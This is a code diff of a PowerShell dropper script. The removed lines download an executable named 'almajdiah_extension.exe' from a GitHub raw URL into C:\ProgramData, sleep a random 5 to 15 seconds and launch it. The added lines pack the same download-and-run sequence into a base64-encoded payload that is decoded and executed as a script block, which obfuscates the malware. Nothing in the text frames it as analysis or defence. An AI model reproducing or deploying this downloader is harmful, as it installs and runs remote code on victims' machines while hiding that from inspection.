@@ -1,18 +1,4 @@
-$frag3 = 'https://github.com/floorsofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe'
-$frag5 = 'C:\ProgramData\program.exe'
-
-$cmd = 'Invoke-WebRequest'
-
-$params = @{
-    Uri     = $frag3
-    OutFile = $frag5
-}
-
-& $cmd @params
- # Reconstruct and execute
-
-$randDelay = [Math]::Abs((Get-Random) % 10) + 5  # Random delay 5-15 seconds
-Start-Sleep -Seconds $randDelay
-
-$procStart = 'Start-Process'
-& $procStart $frag5
+$encodedPayload = 'JABmAHIAYQBnADMAPQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='  # Replace with your actual base64 string, e.g., SGVsbG8gd29ybGQh
+$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload))
+$exec = [ScriptBlock]::Create($decoded)
+& $exec
